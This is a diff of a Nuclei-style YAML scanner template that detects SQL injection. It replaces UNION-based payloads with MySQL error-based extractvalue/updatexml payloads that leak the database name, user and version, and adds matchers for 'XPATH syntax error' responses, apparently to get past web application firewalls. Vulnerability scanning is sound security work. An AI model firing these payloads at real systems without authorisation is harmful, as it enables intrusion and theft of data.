@@ -1,9 +1,10 @@
-id: nawab-confirmed-sqli
+id: nawab-confirmed-sqli-bypass
 
 info:
-  name: 💀 Nawab-Confirmed-SQLi 💀
+  name: Nawab-Validated-SQLi-WAF-Bypass
   author: thenawabx
   severity: critical
+  description: Validated SQL Injection using XPATH error-based leakage patterns.
 
 http:
   - method: GET
@@ -12,8 +13,10 @@ http:
 
     payloads:
       sqli_payloads:
-        - "-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"
-        - "-1' UNION SELECT 1,database(),user(),4--"
+        - "1' AND (extractvalue(1,concat(0x7e,(SELECT database()),0x7e)))--"
+        - "1\" AND (extractvalue(1,concat(0x7e,(SELECT user()),0x7e)))--"
+        - "1' AND (updatexml(1,concat(0x7e,(SELECT version()),0x7e),1))--"
+        - "1' AND 1=(SELECT 1 FROM (SELECT(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))))x)--"
 
     fuzzing:
       - part: query
@@ -25,10 +28,17 @@ http:
     matchers:
       - type: regex
         regex:
-          - "(?i)(information_schema|table_name|column_name)"
-          - "[a-zA-Z0-9_]+@[a-zA-Z0-9.-]+" # Matches user@host format
+          - "XPATH syntax error: '~[a-zA-Z0-9_\\-]+~'"
+        part: body
+
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - "updatexml"
+        condition: or
         part: body
 
       - type: status
         status:
           - 200
+          - 500
